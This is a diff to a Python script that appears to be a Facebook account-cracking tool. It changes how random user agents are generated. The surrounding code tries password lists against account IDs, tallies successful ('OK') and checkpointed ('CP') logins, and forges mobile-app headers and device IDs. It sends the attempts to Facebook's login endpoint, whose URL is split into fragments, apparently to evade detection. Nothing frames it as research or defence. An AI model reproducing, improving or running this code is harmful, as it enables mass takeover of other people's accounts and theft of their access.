@@ -1205,7 +1205,7 @@ def m7(ids,pwv):
     animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
     sys.stdout.write(f"\r{rad}[{green}{animasi}-M7{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
     sys.stdout.flush()
-    usragnt = user_agent
+    usragnt = DEF3()
     warna = random.choice(my_color)
     try:
         for pas in pwv:
@@ -1446,7 +1446,7 @@ def __MTDONEE__(ids, names, passlist, total_ids):
             netheni = str(random.randint(20000, 40000))
             simheni = str(random.randint(20000, 40000))
             cban = str(random.randint(20000000, 30000000))
-            user_agent = mls1()
+            user_agent = DEF3()
             warna = random.choice(my_color)
             adid = str(uuid.uuid4()).upper()
             device_id = str(uuid.uuid4()).upper()
@@ -1473,7 +1473,7 @@ def __MTDONEE__(ids, names, passlist, total_ids):
                 "x-fb-connection-quality: EXCELLENT",
                 "content-type: application/x-www-form-urlencoded",
                 "x-fb-http-engine: Liger",
-                f"User-Agent: {user_agent.encode('utf-8')}",
+                f"User-Agent: {user_agent}",
             ]
             url = "https://a"+"pi.face"+"book.c"+"om/a"+"uth/login"
             buffer = BytesIO()
